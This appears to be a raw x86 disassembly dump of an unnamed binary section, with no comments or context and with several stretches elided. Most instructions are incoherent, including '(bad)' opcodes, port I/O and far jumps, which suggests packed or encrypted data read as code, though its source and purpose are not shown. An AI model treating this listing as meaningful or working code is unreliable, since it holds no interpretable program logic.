  41e717:	lock stos DWORD PTR es:[edi],eax
  41e719:	inc    esi
  41e71a:	and    esi,DWORD PTR ds:0x732d4c96
  41e720:	dec    dh
  41e722:	xor    ch,BYTE PTR [ebx]
  41e724:	push   ebx
  41e725:	jge    0x41e6de
  41e727:	imul   eax,DWORD PTR [ecx-0x3cf541cb],0xffffffaa
  41e72e:	test   bh,ah
  41e730:	mov    ds:0x9f31103e,eax
  41e735:	push   cs
  41e736:	xchg   esp,eax
  41e737:	sub    al,0x1c
  41e739:	dec    ebx
  41e73a:	test   al,0x56
  41e73c:	push   esi
  41e73d:	dec    esi
  41e73e:	adc    al,0xc6
  41e740:	shr    DWORD PTR [esi],1
  41e742:	dec    esi
  41e743:	sub    DWORD PTR [ebx-0x4c742cb4],esp
  41e749:	popf   
  41e74a:	inc    ebx
  41e74b:	cmp    BYTE PTR [ebx+0x67],0x4d
  41e74f:	mov    BYTE PTR [edi-0x3f491a66],bh
  41e755:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e756:	mov    edx,0xa00bf5f
  41e75b:	and    BYTE PTR [ecx+0x4aa4ea15],al
  41e761:	push   0x13ae8c2a
  41e766:	mov    BYTE PTR [eax+0x4],al
  41e769:	inc    edi
  41e76a:	and    al,BYTE PTR [eax+0x76]
  41e76d:	nop
  41e76e:	outs   dx,BYTE PTR ds:[esi]
  41e76f:	jb     0x41e78b
  41e771:	fisub  DWORD PTR [ebp+0x46]
  41e774:	fsubr  QWORD PTR [esi+0x56]
  41e777:	xor    dl,BYTE PTR [esi]
  41e779:	inc    edi
  41e77a:	aad    0x9d
  41e77c:	jge    0x41e749
  41e77e:	fidiv  DWORD PTR [edi-0x5b]
  41e781:	je     0x41e7bf
  41e783:	inc    esp
  41e784:	xor    BYTE PTR [ebx+ebp*1+0x70],al
  41e788:	ret    0xdbaa
  41e78b:	cmp    BYTE PTR [ecx+0x38],0x41
  41e78f:	mov    ds,ebx
  41e791:	aam    0x74
  41e793:	ds mov bh,0x2a
  41e796:	fs jbe 0x41e765
  41e799:	out    0xf9,al
  41e79b:	jmp    0xbd76dae
  41e7a0:	fwait
  41e7a1:	mov    eax,0x3b0d2611
  41e7a6:	mov    ebx,0x84339a2c
  41e7ab:	fwait
  41e7ac:	in     al,0xd
  41e7ae:	mov    bh,0xf7
  41e7b0:	xchg   esp,eax
  41e7b1:	or     BYTE PTR [ebx-0x43],ch
  41e7b4:	loope  0x41e7fe
  41e7b6:	adc    ah,bh
  41e7b8:	mov    al,0x2b
  41e7ba:	addr16 out 0x95,eax
  41e7bd:	pop    edi
  41e7be:	dec    esp
  41e7bf:	cmc    
  41e7c0:	pop    eax
  41e7c1:	call   0x1123db4f
  41e7c6:	push   ebx
  41e7c7:	xchg   esi,eax
  41e7c8:	inc    eax
  41e7c9:	sbb    bh,BYTE PTR [eax+0x54]
  41e7cc:	or     bh,BYTE PTR [eax-0xdc2723b]
  41e7d2:	sahf   
  41e7d3:	push   ecx
  41e7d4:	ret    
  41e7d5:	pop    ebx
  41e7d6:	mov    edx,0xb1e59c6
  41e7db:	or     eax,0xbd501604
  41e7e0:	mov    es,eax
  41e7e2:	adc    BYTE PTR [edi],al
  41e7e4:	loop   0x41e854
  41e7e6:	int    0x96
  41e7e8:	out    0x63,eax
  41e7ea:	out    dx,al
  41e7eb:	(bad)  
  41e7ec:	xlat   BYTE PTR ds:[ebx]
  41e7ed:	repnz adc eax,0x9560bc78
  41e7f3:	dec    eax
  41e7f4:	ja     0x41e802
  41e7f6:	ds sbb ebx,edx
  41e7f9:	inc    ebp
  41e7fa:	dec    esi
  41e7fb:	lods   al,BYTE PTR gs:[esi]
  41e7fd:	push   edx
  41e7fe:	pop    eax
  41e7ff:	lods   eax,DWORD PTR ds:[esi]
  41e800:	sar    BYTE PTR [esp+edx*2-0x4ddcd217],1
  41e807:	jb     0x41e872
  41e809:	mov    WORD PTR [bp+si+0x6d],?
  41e80d:	mov    ecx,0xc89a
	...
  41e872:	add    BYTE PTR [eax],al
  41e874:	sub    eax,0x9e5c8a39
  41e879:	(bad)  
  41e87a:	(bad)  
  41e87b:	jns    0x41e8ec
  41e87d:	xor    al,0xcc
  41e87f:	jg     0x41e8cc
  41e881:	jnp    0x41e81c
  41e883:	lea    esp,[eax+0x4000144]
  41e889:	add    DWORD PTR [eax],eax
  41e88b:	add    BYTE PTR [ebx-0x41],dl
  41e88e:	pop    ebp
  41e88f:	jb     0x41e901
  41e891:	inc    eax
  41e892:	mov    edx,0x70a93b86
  41e897:	mov    ds:0xdb3678f1,eax
  41e89c:	jp     0x41e8d3
  41e89e:	cli    
  41e89f:	outs   dx,BYTE PTR ds:[esi]
  41e8a0:	cwde   
  41e8a1:	aam    0x36
  41e8a3:	cmp    esi,DWORD PTR [edi+edi*1+0x1d]
  41e8a7:	leave  
  41e8a8:	(bad)  
  41e8a9:	das    
  41e8aa:	mov    al,0xfa
  41e8ac:	(bad)  
  41e8ad:	xor    cl,BYTE PTR [ebp+0x7b02fa7e]
  41e8b3:	std    
  41e8b4:	sbb    eax,0xdec9303a
  41e8b9:	inc    ebp
  41e8ba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e8bb:	addr16 jno 0x41e843
  41e8be:	jg     0x41e899
  41e8c0:	sub    BYTE PTR [ebx+edi*8],al
  41e8c3:	call   0x283e:0x5faa2974
  41e8ca:	xchg   esi,eax
  41e8cb:	mov    cl,BYTE PTR [ebp-0x48e52618]
  41e8d1:	jle    0x41e8e5
  41e8d3:	(bad)  
  41e8d4:	dec    esp
  41e8d5:	repnz outs dx,BYTE PTR ds:[esi]
  41e8d7:	or     edx,DWORD PTR [edx-0x6c83ebf2]
  41e8dd:	outs   dx,DWORD PTR ds:[esi]
  41e8de:	addr16 inc edx
  41e8e0:	mov    ch,0xc2
  41e8e2:	mov    eax,ds:0xcdc8a5c6
  41e8e7:	enter  0xeaae,0x19
  41e8eb:	add    eax,0x363d8fe7
  41e8f0:	pushf  
  41e8f1:	js     0x41e879
  41e8f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e8f4:	mov    esi,0x3d74fabe
  41e8f9:	test   DWORD PTR [esi-0x47],0x7e5b855b
  41e900:	and    al,0xa6
  41e902:	jo     0x41e8c6
  41e904:	jno    0x41e8f8
  41e906:	lock imul ebx,DWORD PTR [ebx-0x249ca2dc],0x65
  41e90e:	cdq    
  41e90f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e910:	xchg   DWORD PTR [esi-0x29],eax
  41e913:	or     esi,esp
  41e915:	dec    eax
  41e916:	cmp    DWORD PTR [eax+0x2a],0xd71be09f
  41e91d:	dec    esp
  41e91e:	fnstenv [ebx+0x1bbacee4]
  41e924:	lahf   
  41e925:	loop   0x41e8eb
  41e927:	retf   
  41e928:	xchg   ebx,eax
  41e929:	mov    esp,0xf73a3044
  41e92e:	mov    ds:0x532b5d7c,al
  41e933:	test   DWORD PTR [edi],eax
  41e935:	icebp  
  41e936:	(bad)  
  41e937:	mov    eax,ds:0x5fbaed58
  41e93c:	sbb    BYTE PTR [edi],ch
  41e93e:	xor    esp,esp
  41e940:	idiv   ebx
  41e942:	xchg   esp,eax
  41e943:	(bad)  
  41e944:	js     0x41e8ff
  41e946:	xchg   ecx,eax
  41e947:	xchg   ebx,eax
  41e948:	pop    esp
  41e949:	dec    bp
  41e94b:	daa    
  41e94c:	gs (bad) 
  41e94f:	or     DWORD PTR [ebx],0xffffffc3
  41e952:	mov    ch,0xc7
  41e954:	mov    ds,WORD PTR [edi-0x35]
  41e957:	fst    QWORD PTR [ebp+0x199d51ae]
  41e95d:	jmp    0x7b560309
  41e962:	test   al,0x3b
  41e964:	or     BYTE PTR [esi+eax*4+0x46],cl
  41e968:	popa   
  41e969:	cmp    edx,DWORD PTR [edx]
  41e96b:	sub    eax,0xa6cb177f
  41e970:	and    DWORD PTR [esi-0x56],eax
  41e973:	fsub   DWORD PTR [edx-0x4c2a1c0b]
  41e979:	jbe    0x41e97c
  41e97b:	sub    dl,BYTE PTR ds:0x28f0f489
  41e981:	dec    eax
  41e982:	(bad)
  41e987:	(bad)  
  41e989:	imul   esi,DWORD PTR [ebx+0x2b5c8ab3],0xd0
	...
  41e9f3:	add    BYTE PTR [eax-0x3],bh
  41e9f6:	ret    0xc766
  41e9f9:	jg     0x41e9f7
  41e9fb:	dec    DWORD PTR [edi+0x67]
  41e9fe:	rol    dl,1
  41ea00:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ea01:	jne    0x41e9df
  41ea03:	(bad)  
  41ea04:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ea05:	inc    ebp
  41ea06:	add    DWORD PTR [eax],eax
  41ea08:	add    al,0x1
  41ea0a:	add    BYTE PTR [eax],al
  41ea0c:	inc    edx
  41ea0d:	jns    0x41ea16
  41ea0f:	test   BYTE PTR [esi+edi*8],dh
  41ea12:	sub    eax,ecx
  41ea14:	mov    ah,0x1a
  41ea16:	jo     0x41ea7e
  41ea18:	and    DWORD PTR [ebp-0x7134d2c9],0xffffff9a
  41ea1f:	in     eax,0x52
  41ea21:	sbb    al,0xca
  41ea23:	stos   DWORD PTR es:[edi],eax
  41ea24:	test   ebx,ecx
  41ea26:	psubusw mm7,QWORD PTR [eax+ebx*2-0x1f02713a]
  41ea2e:	mov    esp,0xf33ca62d
  41ea33:	cmp    ebx,DWORD PTR [ebx+0x5e25827d]
  41ea39:	stos   BYTE PTR es:[edi],al
  41ea3a:	or     BYTE PTR [edi+0x60c2fc19],ch
  41ea40:	in     eax,0x30
  41ea42:	test   DWORD PTR [edi-0x5554ec77],edx
  41ea48:	xchg   DWORD PTR ds:0x1b6dbeba,ebx
  41ea4e:	(bad)  
  41ea50:	mov    dh,0xb7
  41ea52:	outs   dx,BYTE PTR ds:[esi]
  41ea53:	sub    al,0xa7
  41ea55:	out    0x25,al
  41ea57:	or     al,0x6f
  41ea59:	hlt    
  41ea5a:	mov    al,BYTE PTR [edx]
  41ea5c:	fdiv   DWORD PTR gs:[edi+ecx*4]
  41ea60:	push   esp
  41ea61:	push   cs
  41ea62:	add    al,BYTE PTR [ecx-0x33]
  41ea65:	push   es
  41ea66:	mov    edx,0x585d9241
  41ea6b:	out    dx,al
  41ea6c:	fiadd  WORD PTR [ebx-0x27]
  41ea6f:	aam    0xbf
  41ea71:	mov    bh,0xfa
  41ea73:	aam    0x57
  41ea75:	aas    
  41ea76:	fild   QWORD PTR [ecx-0xef71b2c]
  41ea7c:	mov    ebx,0x1620dc76
  41ea81:	ins    DWORD PTR es:[edi],dx
  41ea82:	jmp    0x878b4d7c
  41ea87:	jl     0x41ead4
  41ea89:	dec    esi
  41ea8a:	or     bh,BYTE PTR [ecx]
  41ea8c:	dec    edi
  41ea8d:	and    BYTE PTR [edx],al
  41ea8f:	push   cs
  41ea90:	aad    0xbf
  41ea92:	retf   
  41ea93:	(bad)  
  41ea95:	or     al,0xbe
  41ea97:	push   ebp
  41ea98:	fldenv [eax-0x7ca3423b]
  41ea9e:	or     al,BYTE PTR [ebp-0xa]
  41eaa1:	xchg   DWORD PTR [ebp+0x1],ebx
  41eaa4:	mov    ds:0xb50d7bc,eax
  41eaa9:	xor    ebp,DWORD PTR [eax+edi*4+0x6e]
  41eaad:	sbb    eax,0xfc540dca
  41eab2:	xchg   edx,eax
  41eab3:	push   esi
  41eab4:	push   cs
  41eab5:	popf   
  41eab6:	pop    esi
  41eab7:	push   ebx
  41eab8:	jnp    0x41ea74
  41eaba:	ret    0x9081
  41eabd:	mov    cl,BYTE PTR [edi+edi*2+0x73]
  41eac1:	idiv   esp
  41eac3:	xchg   BYTE PTR [eax+0x245309c5],ch
  41eac9:	dec    ebx
  41eaca:	cwde   
  41eacb:	and    cl,BYTE PTR [edx+0xf]
  41eace:	popa   
  41eacf:	lods   al,BYTE PTR ds:[esi]
  41ead0:	or     BYTE PTR [ebx-0x1f5291ff],0xe2
  41ead7:	mov    WORD PTR [esi],es
  41ead9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41eada:	and    eax,0x552f4121
  41eadf:	cdq    
  41eae0:	jb     0x41ea65
  41eae2:	sbb    DWORD PTR [edi+0x36],eax
  41eae5:	imul   esi,DWORD PTR [ecx],0xf2574f32
  41eaeb:	adc    bl,ch
  41eaed:	hlt    
  41eaee:	retf   
  41eaef:	push   ebx
  41eaf0:	mov    ds:0x44c6ec0d,eax
  41eaf5:	div    DWORD PTR [edx+0x59d37603]
  41eafb:	mov    edi,ss
  41eafd:	fnstenv [ecx-0x7465a485]
  41eb03:	fisttp DWORD PTR [esi]
  41eb05:	mov    al,ds:0x9e6dd3d8
  41eb0a:	xchg   edx,ebx
  41eb0c:	dec    edi
  41eb0d:	cmp    DWORD PTR [ebp-0x51],ecx
	...
  41eb74:	adc    ch,BYTE PTR [edi]
  41eb76:	mov    esi,DWORD PTR [edi+edi*4+0xaaf3fb4]
  41eb7d:	out    0x9b,al
  41eb7f:	aad    0xc
  41eb81:	pop    esp
  41eb82:	test   eax,0x146a84f
  41eb87:	add    BYTE PTR [ecx+eax*1],al
  41eb8a:	add    BYTE PTR [eax],al
  41eb8c:	hlt    
  41eb8d:	loope  0x41ebd6
  41eb8f:	jl     0x41eb76
  41eb91:	mov    dh,0xae
  41eb93:	and    BYTE PTR [esi-0x5aa2ce4d],0x96
  41eb9a:	call   0xf328:0x83079a64
  41eba1:	ins    DWORD PTR es:[edi],dx
  41eba2:	test   BYTE PTR [eax+ebx*2+0x7a],bl
  41eba6:	adc    ebx,DWORD PTR [edi+ecx*4+0x6b04cdb0]
  41ebad:	xor    ebx,DWORD PTR [edx]
  41ebaf:	mov    dl,0x44
  41ebb1:	ret    
  41ebb2:	call   0x2b1:0x85e3693d
  41ebb9:	int    0x13
  41ebbb:	(bad)  
  41ebbc:	sub    bh,al
  41ebbe:	pop    ss
  41ebbf:	dec    ecx
  41ebc0:	xchg   DWORD PTR [edx-0x7d8614e0],ecx
  41ebc6:	cs mov ebx,esi
  41ebc9:	sub    esp,DWORD PTR [esi]
  41ebcb:	out    dx,eax
  41ebcc:	cmp    ecx,ebx
  41ebce:	mov    ebx,0xe74dae26
  41ebd3:	fmul   QWORD PTR [edi-0x6]
  41ebd6:	pushf  
  41ebd7:	ffreep st(4)
  41ebd9:	je     0x41ec46
  41ebdb:	add    al,0x54
  41ebdd:	jle    0x41ec49
  41ebdf:	xchg   ebx,eax
  41ebe0:	pop    ebx
  41ebe1:	cmc    
  41ebe2:	out    0x84,al
  41ebe4:	jmp    0x2b32:0xdb72ba27
  41ebeb:	dec    ebx
  41ebec:	(bad)  
  41ebed:	retf   
  41ebee:	jge    0x41ebf3
  41ebf0:	dec    edi
  41ebf1:	mov    ecx,0xd76e2b3f
  41ebf6:	sub    BYTE PTR ds:0xfcf7d5a,ch
  41ebfc:	int    0x26
  41ebfe:	sbb    ebp,DWORD PTR [bx+di+0x23c]
  41ec03:	adc    edx,DWORD PTR [edx]
  41ec05:	frstor [ebx+0x24]
  41ec08:	push   ecx
  41ec09:	jne    0x41ebed
  41ec0b:	inc    ebp
  41ec0c:	test   BYTE PTR [esi+ebx*2],dh
  41ec0f:	sahf   
  41ec10:	inc    esi
  41ec11:	mov    al,0xca
  41ec13:	je     0x41ec8a
  41ec15:	jb     0x41ebbc
  41ec17:	add    DWORD PTR [ecx+0x58],0xffffffea
  41ec1b:	sub    DWORD PTR [eax],ebx
  41ec1d:	and    BYTE PTR [edi+esi*8],bh
  41ec20:	ror    BYTE PTR [esi-0x3f905e66],1
  41ec26:	jmp    0x7b0:0x8a3fe6b8
  41ec2d:	std    
  41ec2e:	rcl    DWORD PTR [ecx+0x57a44a71],1
  41ec34:	sbb    al,0xe5
  41ec36:	pop    esp
  41ec37:	rol    DWORD PTR [edx-0x42],0xbd
  41ec3b:	fwait
  41ec3c:	mov    esi,0x594e1ced
  41ec41:	in     eax,dx
  41ec42:	add    esi,DWORD PTR [edi-0x6f]
  41ec45:	inc    edx
  41ec46:	fldcw  WORD PTR [ebx-0x5396d990]
  41ec4c:	repnz pop ecx
  41ec4e:	mov    ebp,0xa3e786bb
  41ec53:	cmp    al,0x13
  41ec55:	(bad)  
  41ec56:	jmp    0xc11a6ca
  41ec5b:	add    eax,0xfe4f010b
  41ec60:	push   ds
  41ec61:	xor    BYTE PTR [eax+edi*4-0x45582e8c],0x1b
  41ec69:	push   es
  41ec6a:	lds    esp,FWORD PTR [edi+0x42]
  41ec6d:	dec    eax
  41ec6e:	outs   dx,BYTE PTR ds:[esi]
  41ec6f:	js     0x41ece7
  41ec71:	jno    0x41ec0b
  41ec73:	inc    edi
  41ec74:	dec    dx
  41ec76:	jno    0x41ecb0
  41ec78:	mov    ch,0xa
  41ec7a:	fcom   DWORD PTR [ebx+0xf]
  41ec7d:	into   
  41ec7e:	gs sbb eax,ecx
  41ec81:	dec    ebx
  41ec82:	mov    cl,0xf7
  41ec84:	and    edi,DWORD PTR [ecx+0x20e2ec02]
  41ec8a:	paddq  mm6,mm7
  41ec8d:	adc    BYTE PTR [ebp+0x89],0x0
	...
  41ecf4:	inc    ecx
  41ecf5:	icebp  
  41ecf6:	(bad)
  41ecf9:	hlt    
  41ecfa:	gs icebp 
  41ecfc:	dec    edi
  41ecfd:	adc    eax,0xa5cf5fd0
  41ed02:	push   0x147ac7b
  41ed07:	add    BYTE PTR [ecx+eax*1],al
  41ed0a:	add    BYTE PTR [eax],al
  41ed0c:	dec    ebp
  41ed0d:	je     0x41ed8b
  41ed0f:	ja     0x41ed1d
  41ed11:	js     0x41ed53
  41ed13:	mov    ecx,0x7d29003f
  41ed18:	push   ss
  41ed19:	mov    ds:0xd4cc294f,al
  41ed1e:	mov    eax,0x5fac5c9a
  41ed23:	mov    ecx,0x81512e78
  41ed28:	pop    ebp
  41ed29:	inc    ecx
  41ed2a:	inc    ebx
  41ed2b:	pop    eax
  41ed2c:	retf   0x7443
  41ed2f:	aad    0xa4
  41ed31:	in     eax,dx
  41ed32:	xor    ebp,DWORD PTR [ebx]
  41ed34:	add    BYTE PTR [edi+edi*1+0x74],ch
  41ed38:	(bad)  
  41ed39:	and    al,0xec
  41ed3b:	call   0x14ca:0x4b5fa3ec
  41ed42:	rcr    BYTE PTR [ecx+0x62],0x63
  41ed46:	push   eax
  41ed47:	(bad)  
  41ed48:	retf   0x2aff
  41ed4b:	int3   
  41ed4c:	push   ecx
  41ed4d:	or     edx,ebx
  41ed4f:	push   ebx
  41ed50:	fst    QWORD PTR [eax]
  41ed52:	adc    BYTE PTR [esi],bh
  41ed54:	mov    al,0x29
  41ed56:	dec    eax
  41ed57:	inc    ebx
  41ed58:	adc    eax,0xdf950658
  41ed5d:	ss add cl,dh
  41ed60:	add    eax,0x598ed1df
  41ed65:	pop    ss
  41ed66:	and    BYTE PTR [ebx],bh
  41ed68:	inc    eax
  41ed69:	and    bh,BYTE PTR [edx+0x41]
  41ed6c:	mov    edi,0x20146e7d
  41ed71:	adc    al,BYTE PTR [ecx]
  41ed73:	xor    bl,BYTE PTR [eax-0x7d]
  41ed76:	shl    BYTE PTR [edx+0x52],0x80
  41ed7a:	xor    al,0x3f
  41ed7c:	aam    0x82
  41ed7e:	fnstsw WORD PTR [ecx-0x23]
  41ed81:	jecxz  0x41edf7
  41ed83:	dec    edi
  41ed84:	mov    edi,0x2b92be99
  41ed89:	add    eax,0xf4a6f1eb
  41ed8e:	or     eax,DWORD PTR [eax-0x45]
  41ed91:	and    DWORD PTR [ebx-0x774995a0],ebx
  41ed97:	dec    esi
  41ed98:	sti    
  41ed99:	mov    ds:0xc40b59b,al
  41ed9e:	push   eax
  41ed9f:	xor    ch,BYTE PTR [ecx+0x20c680e]
  41eda5:	cmp    al,0x73
  41eda7:	xchg   ebx,eax
  41eda8:	aas    
  41eda9:	dec    eax
  41edaa:	fadd   st(7),st
  41edac:	test   eax,0xec3fcae2
  41edb1:	lahf   
  41edb2:	jl     0x41eda2
  41edb4:	and    DWORD PTR [eax+ebx*8+0x78],ecx
  41edb8:	pop    esi
  41edb9:	sbb    BYTE PTR [edi-0x677b0c48],0xd2
  41edc0:	js     0x41ed58
  41edc2:	fild   DWORD PTR [eax+0x5339ccd4]
  41edc8:	(bad)  
  41edc9:	clc    
  41edca:	push   ds
  41edcb:	push   esi
  41edcc:	jo     0x41ee2a
  41edce:	ins    DWORD PTR es:[edi],dx
  41edcf:	dec    edx
  41edd0:	or     eax,0xd8b856f0
  41edd5:	leave  
  41edd6:	add    eax,0xf66530b1
  41eddb:	or     DWORD PTR [ebp+0x65],0xfe76c6b8
  41ede2:	mov    cl,0xaf
  41ede4:	retf   0x795c
  41ede7:	and    BYTE PTR [ebp+0x76],al
  41edea:	jmp    0x8b2878d0
  41edef:	push   0xffffffb6
  41edf1:	pop    edi
  41edf2:	mov    dl,0x98
  41edf4:	mov    bl,0xbb
  41edf6:	push   ds
  41edf7:	pop    ecx
  41edf8:	fidiv  WORD PTR [esi]
  41edfa:	iret   
  41edfb:	xor    eax,0xd4ad19ca
  41ee00:	mov    ebx,0xb404d0b5
  41ee05:	dec    ebp
  41ee06:	xor    BYTE PTR [esi+0x4d3cb7cc],ah
  41ee0c:	pushf  
  41ee0d:	and    ah,BYTE PTR [eax]
  41ee0f:	rol    DWORD PTR [eax],1
	...
  41ee71:	add    BYTE PTR [eax],al
  41ee73:	add    BYTE PTR ds:0x7b197956,al
  41ee79:	aas    
  41ee7a:	gs pop esi
  41ee7c:	pop    edx
  41ee7d:	repnz call 0xb04f:0xdb7700e7
  41ee85:	dec    eax
  41ee86:	add    DWORD PTR [eax],eax
  41ee88:	add    al,0x1
  41ee8a:	add    BYTE PTR [eax],al
  41ee8c:	mov    eax,DWORD PTR [ebp-0x27407338]
  41ee92:	dec    ebp
  41ee93:	dec    edx
  41ee94:	rcl    BYTE PTR [ebp+0xe2ab002],1
  41ee9a:	pop    esp
  41ee9b:	outs   dx,BYTE PTR ds:[esi]
  41ee9c:	xchg   ebp,eax
  41ee9d:	(bad)  
  41ee9e:	mov    al,ds:0x3c405557
  41eea3:	dec    ecx
  41eea4:	add    eax,0x6a4fc363
  41eea9:	call   0x122dc820
  41eeae:	int    0xc
  41eeb0:	out    dx,al
  41eeb1:	inc    esp
  41eeb2:	mov    al,0x17
  41eeb4:	sbb    cl,0x32
  41eeb7:	mov    ebp,0xb9c828d5
  41eebc:	sbb    BYTE PTR [ecx-0x1a],dh
  41eebf:	imul   edx,ebp,0x5adc51b6
  41eec5:	mov    es,WORD PTR [edx-0x6f]
  41eec8:	pop    ds
  41eec9:	add    cl,BYTE PTR [ebx]
  41eecb:	xchg   ebx,eax
  41eecc:	enter  0xd78c,0x4f
  41eed0:	mov    ecx,0x576bc9d4
  41eed5:	imul   BYTE PTR [eax+edi*4]
  41eed8:	mov    edi,0x877eba43
  41eedd:	std    
  41eede:	int3   
  41eedf:	jg     0x41eeb6
  41eee1:	push   0x5d
  41eee3:	mov    ebx,0x4df1e83b
  41eee8:	(bad)  
  41eee9:	inc    ebp
  41eeea:	cs push ss
  41eeec:	jle    0x41ee78
  41eeee:	outs   dx,BYTE PTR ds:[esi]
  41eeef:	popa   
  41eef0:	push   esp
  41eef1:	fs xor esp,edi
  41eef4:	outs   dx,BYTE PTR ds:[esi]
  41eef5:	xchg   ebp,eax
  41eef6:	pop    ecx
  41eef7:	or     ebp,DWORD PTR [edi]
  41eef9:	mov    WORD PTR [esi+0xa],?
  41eefc:	out    dx,al
  41eefd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41eefe:	xor    al,0xd2
  41ef00:	push   edi
  41ef01:	sbb    BYTE PTR [esi],0x9a
  41ef04:	repnz or BYTE PTR [ecx+0x26],bl
  41ef08:	(bad)
  41ef0b:	mov    BYTE PTR [edx],cl
  41ef0d:	add    DWORD PTR [ebp-0x3e],ebx
  41ef10:	(bad)  
  41ef11:	(bad)  [edi]
  41ef13:	sbb    eax,0xaf6874b9
  41ef18:	retf   0x4095
  41ef1b:	inc    edi
  41ef1c:	mov    ebx,0x6e2d3d74
  41ef21:	mov    eax,0x168710c3
  41ef26:	xor    ebx,DWORD PTR [edx]
  41ef28:	test   eax,0x1707eaa9
  41ef2d:	cmc    
  41ef2e:	fcom   DWORD PTR [ebx]
  41ef30:	fwait
  41ef31:	mov    ch,0xd
  41ef33:	mov    ch,0xcc
  41ef35:	imul   edx,DWORD PTR [edx+edi*8+0x74ae0a9],0x7206c784
  41ef40:	icebp  
  41ef41:	repz inc BYTE PTR [edx-0x60cb4eb2]
  41ef48:	retf   0xe753
  41ef4b:	ins    DWORD PTR es:[edi],dx
  41ef4c:	inc    DWORD PTR ds:0x69ea47a4
  41ef52:	aam    0xdb
  41ef54:	add    DWORD PTR ds:0x2078b351,0x72
  41ef5b:	jo     0xe2ebf19
  41ef61:	adc    eax,0xc2a4eada
  41ef66:	inc    BYTE PTR [ebx]
  41ef68:	jecxz  0x41efda
  41ef6a:	push   ebp
  41ef6b:	cmp    al,0x4c
  41ef6d:	and    al,0x54
  41ef6f:	call   0x5894b7f2
  41ef74:	xchg   edx,eax
  41ef75:	inc    esp
  41ef76:	and    edi,edi
  41ef78:	int3   
  41ef79:	retf   
  41ef7a:	add    bl,BYTE PTR [edi-0x52]
  41ef7d:	inc    esp
  41ef7e:	inc    esi
  41ef7f:	dec    edx
  41ef80:	shl    ah,1
  41ef82:	rcr    DWORD PTR [ebx+0x466cfc10],cl
  41ef88:	pop    ss
  41ef89:	jp     0x41efe1
  41ef8b:	mov    ah,0xa4
  41ef8d:	or     DWORD PTR [ebx+ebp*8],edi
	...
  41eff4:	mov    ecx,0xff25bf5d
  41eff9:	out    0xbb,eax
  41effb:	fisttp QWORD PTR [ecx+0x0]
  41effe:	lock imul ecx,ebx,0x3b
  41f002:	mov    ds:0x149b461,eax
  41f007:	add    BYTE PTR [ecx+eax*1],al
  41f00a:	add    BYTE PTR [eax],al
  41f00c:	sub    DWORD PTR [esi],esp
  41f00e:	out    dx,eax
  41f00f:	xor    BYTE PTR [ecx],0xf3
  41f012:	shl    BYTE PTR ds:0x61b4012b,1
  41f018:	mov    dh,0x6
  41f01a:	cmp    BYTE PTR [ebx+0x0],0x8b
  41f01e:	jmp    0x41f067
  41f020:	pushf  
  41f021:	retf   
  41f022:	xchg   ebp,eax
  41f023:	mov    eax,ds:0x8e8c142c
  41f028:	shl    BYTE PTR [esi+0x77],cl
  41f02b:	sbb    eax,0xe726f536
  41f030:	pop    ds
  41f031:	aam    0x4c
  41f033:	mov    dh,0xac
  41f035:	test   al,0x60
  41f037:	dec    eax
  41f038:	int    0x6a
  41f03a:	jge    0x41f01d
  41f03c:	(bad)  
  41f03e:	int    0x5f
  41f040:	shl    dh,cl
  41f042:	(bad)  [eax-0x4f21ed6f]
  41f048:	mov    ah,0xa2
  41f04a:	cmp    ecx,edx
  41f04c:	sub    DWORD PTR [ebp-0x78],eax
  41f04f:	xor    ah,dh
  41f051:	in     al,0x26
  41f053:	popf   
  41f054:	inc    ecx
  41f055:	aam    0x6a
  41f057:	jmp    0x37cb32ea
  41f05c:	mov    ds:0x2172abe1,al
  41f061:	inc    ebx
  41f062:	jmp    DWORD PTR [eax+0x7e4189de]
  41f068:	pusha  
  41f069:	jmp    FWORD PTR [edx-0x5e]
  41f06c:	mov    ebx,0x9fefee80
  41f071:	add    DWORD PTR [edi-0x45],ebx
  41f074:	lahf   
  41f075:	in     al,0x7a
  41f077:	mov    dh,0x19
  41f079:	rcr    DWORD PTR [eax+ebp*8],cl
  41f07c:	in     eax,dx
  41f07d:	iret   
  41f07e:	fdiv   st(2),st
  41f080:	je     0x41f014
  41f082:	and    dl,BYTE PTR [esi-0x3c]
  41f085:	add    eax,0xc147950d
  41f08a:	sbb    DWORD PTR [esi],edx
  41f08c:	(bad)  
  41f08d:	daa    
  41f08e:	ins    DWORD PTR es:[edi],dx
  41f08f:	out    dx,al
  41f090:	sbb    al,0xf2
  41f092:	int    0xde
  41f094:	and    BYTE PTR [esi+0x78337c11],dh
  41f09a:	dec    eax
  41f09b:	test   ch,ch
  41f09d:	jg     0x41f074
  41f09f:	jne    0x41f0ca
  41f0a1:	sbb    ch,BYTE PTR [esi]
  41f0a3:	mov    ds:0xe12e4583,al
  41f0a8:	mul    DWORD PTR [edx]
  41f0aa:	mov    es,WORD PTR [ebp-0x13202bae]
  41f0b0:	int    0x12
  41f0b2:	pushf  
  41f0b3:	clc    
  41f0b4:	pushf  
  41f0b5:	jge    0x41f058
  41f0b7:	fisub  WORD PTR [edx+ecx*2+0x2ff05faa]
  41f0be:	push   esp
  41f0bf:	push   eax
  41f0c0:	and    eax,0x9f614e5
  41f0c5:	in     eax,0xf8
  41f0c7:	aam    0x77
  41f0c9:	dec    edx
  41f0ca:	jnp    0x41f0b1
  41f0cc:	push   esp
  41f0cd:	push   ecx
  41f0ce:	(bad)  
  41f0cf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f0d0:	mov    bh,cl
  41f0d2:	sub    al,0x3
  41f0d4:	or     BYTE PTR [ebx+0x54],al
  41f0d7:	cmp    edi,DWORD PTR [ebx+0x7609ca2f]
  41f0dd:	clc    
  41f0de:	gs xor esi,ebp
  41f0e1:	push   ss
  41f0e2:	arpl   WORD PTR [esi],ax
  41f0e4:	mov    edx,esp
  41f0e6:	gs push ebx
  41f0e8:	mov    esi,0xf9735d11
  41f0ed:	add    edx,DWORD PTR [ecx+0x5d03cee8]
  41f0f3:	data16 idiv bh
  41f0f6:	loopne 0x41f10b
  41f0f8:	ficomp WORD PTR [ebx+0x17]
  41f0fb:	ins    BYTE PTR es:[edi],dx
